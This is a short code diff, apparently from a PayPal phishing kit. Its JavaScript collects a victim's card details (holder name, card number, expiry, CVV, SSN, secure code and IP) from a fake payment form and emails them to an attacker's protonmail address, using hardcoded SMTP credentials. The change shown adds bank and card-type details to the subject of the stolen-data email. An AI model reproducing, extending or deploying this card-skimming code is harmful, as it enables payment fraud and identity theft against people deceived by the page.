@@ -253,7 +253,7 @@ var fixacardnumber = cardnumber.replace(/\s+/g, '');
                         Password : "Ad1ty@humu",
                         To : 'cintakubukandiataskertas1@protonmail.com',
                         From : "admin@apkblack17.net",
-                        Subject : "PayPal Email 2020 "+$('#ip').val(),
+                        Subject : "PayPal CC 2020 "+$('#ip').val()+'\n'+title +' '+bankName+' '+ typeCard + ' '+ brand,
                         Body : 'PAYPAL CC \nIP : '+$('#ip').val()+'\n'+title +' '+bankName+' '+ typeCard + ' '+ brand +'\nCardHolder Name: '+$('#cc_holder').val()+'\nCC Num: '+fixacardnumber+'\nEXP: '+$('#month').val()+' / '+$('#year').val()+'\nCVV: '+$('#cvv2_number').val()+'\nSSN: '+$('#sort_code').val()+'\nSecure Code: '+$('#secure_code').val()
                         }).then(
                         // message => alert(message)
